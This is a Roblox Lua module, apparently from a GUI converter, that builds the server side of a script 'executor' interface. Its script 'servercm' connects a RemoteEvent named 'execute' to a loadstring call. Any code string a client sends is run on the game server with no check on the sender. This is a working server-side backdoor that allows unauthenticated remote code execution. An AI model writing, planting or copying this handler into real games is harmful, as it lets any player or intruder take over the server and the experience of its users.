local module = {}

function module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settings, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	-- Scripts:

	local function SELVO_fake_script() -- exec.servercm 
		local script = Instance.new('Script', exec)
		script.Name = "servercm"

		local remotes = {
			execute = script.Parent:WaitForChild("execute");
		}

		local loadstring = require(game:GetService("ServerScriptService").loadstring)

		remotes.execute.OnServerEvent:Connect(function(_, code)
			loadstring(code)()
		end)
	end
	coroutine.wrap(SELVO_fake_script)()
end

return module
